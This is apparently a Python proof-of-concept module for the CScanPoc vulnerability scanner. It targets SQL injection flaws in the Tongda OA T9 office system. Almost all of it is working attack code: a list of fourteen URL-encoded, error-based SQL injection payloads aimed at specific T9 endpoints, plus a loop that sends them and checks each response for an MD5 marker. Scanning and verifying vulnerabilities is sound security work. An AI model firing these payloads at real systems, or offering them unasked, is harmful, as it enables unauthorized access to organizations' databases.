# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'TongdaOA_0011'  # 平台漏洞编号，留空
    name = '通达T9系统 SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-03-13'  # 漏洞公布时间
    desc = '''
        通达OA系统代表了协同OA的先进理念,16年研发铸就成熟OA产品。
        通达OAT9智能管理平台是基于B/S架构，灵活、稳定、安全、高性能的办公系统。采用自主研发的引擎技术，提供强大的工作流和公文流程管理功能，可完全根据客户需求定制办公门户平台。
        由于参数过滤不严谨，造成SQL注入漏洞。
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=0101037'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '通达OA系统'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '7063b61c-206e-4849-b6b8-3aece6c9478d'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-17'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # refer: http://www.wooyun.org/bugs/wooyun-2015-0101037
            # refer2: http://www.wooyun.org/bugs/wooyun-2014-082959
            hh = hackhttp.hackhttp()
            payloads = [
                '/t9/t9/project/system/act/T9ProjSystemAct/getStyleList.act?classNo=PROJ_TYPE\'%20and%20(select%201%20from%20(select%20count(*),concat(md5(1),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)%23',
                '/t9/t9/project/system/act/T9ProjSystemAct/getNewPriv.act?privCode=NOAPPROVE\'%20and%20(select%201%20from%20(select%20count(*),concat(md5(1),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)%23',
                '/t9/t9/project/system/act/T9ProjSystemAct/getApproveList.act?privCode=APPROVE\'%20and%20(select%201%20from%20(select%20count(*),concat(md5(1),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)%23',
                '/t9/t9/project/system/act/T9ProjSystemAct/getStyleList.act?classNo=PROJ_TYPE\'%20and%20(select%201%20from%20(select%20count(*),concat(md5(1),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)%23',
                '/t9/t9/core/funcs/doc/act/T9MyWorkAct/hasWork.act?sortId=183299992%20oR%20(select%201%20from%20(select%20count(*),concat(md5(1),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)',
                '/t9/t9/core/codeclass/act/T9CodeClassAct/deleteCodeItem.act?sqlId=133999995%20oR%20(select%201%20from%20(select%20count(*),concat(md5(1),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)%23',
                '/t9/t9/core/funcs/email/act/T9InnerEMailAct/deletM.act?bodyId=3)%20and%20(select%201%20from%20(select%20count(*),concat(md5(1),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)%23&deType=4',
                '/t9/t9/subsys/oa/vote/act/T9VoteTitleAct/selectId2.act?seqId=323\'%20AND%20(SELECT%202538%20FROM(SELECT%20COUNT(*),CONCAT(md5(1),FLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x)a)%20AND%20\'GhCY\'=\'GhCY',
                '/t9/t9/subsys/oa/vote/act/T9VoteTitleAct/deleteVote.act?seqIds=9123125434)%20oR%20(SELECT%207548%20FROM(SELECT%20COUNT(*),CONCAT(md5(1),FLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x)a)%20AND%20(7770=7770',
                '/t9/t9/subsys/oa/vote/act/T9VoteTitleAct/clonVote.act?seqIds=9123125434)%20oR%20(SELECT%207548%20FROM(SELECT%20COUNT(*),CONCAT(md5(1),FLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x)a)%20AND%20(7770=7770',
                '/t9/t9/subsys/oa/vote/act/T9VoteTitleAct/updateNoTopVote.act?seqIds=9123125434)%20oR%20(SELECT%207548%20FROM(SELECT%20COUNT(*),CONCAT(md5(1),FLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x)a)%20AND%20(7770=7770',
                '/t9/t9/core/funcs/news/act/T9NewsShowAct/getDeskNewsAllList.act?type=WTFftW\'%20Or%20(SELECT%202538%20FROM(SELECT%20COUNT(*),CONCAT(md5(1),FLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x)a)%20AND%20\'GhCY\'=\'GhCY',
                '/t9/t9/core/funcs/workflow/act/T9MyWorkAct/hasWork.act?sortId=9123125434)%20oR%20(SELECT%207548%20FROM(SELECT%20COUNT(*),CONCAT(md5(1),FLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x)a)%20AND%20(7770=7770',
                '/t9/t9/core/funcs/workflow/act/T9WorkQueryAct/getFlowTypeJson.act?sortId=19123125434)%20oR%20(SELECT%207548%20FROM(SELECT%20COUNT(*),CONCAT(md5(1),FLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x)a)%20AND%20(7770=7770',
            ]
            md5_1 = 'c4ca4238a0b923820dcc509a6f75849b1'
            for payload in payloads:
                url = self.target + payload
                code, head, res, err, _ = hh.http(url)
                if code == 200 and md5_1 in res:
                    #security_hole(payload+' : sql注入');
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞，漏洞地址为{url}'.format(
                        target=self.target, name=self.vuln.name, url=url))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
